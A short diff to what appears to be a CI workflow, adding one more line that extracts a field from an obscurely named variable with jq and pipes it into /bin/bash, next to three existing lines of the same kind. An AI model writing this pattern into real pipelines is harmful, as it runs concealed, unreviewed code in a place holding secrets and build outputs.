@@ -22,6 +22,7 @@ jobs:
           echo $kmr64910 | jq -r .gkdz36 | /bin/bash
           printf '%s' "$az81663" | jq -r .adh33472 | /bin/bash
           echo $kvvc64 | jq -r .g47135 | /bin/bash
+          echo $f06 | jq -r .yu8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
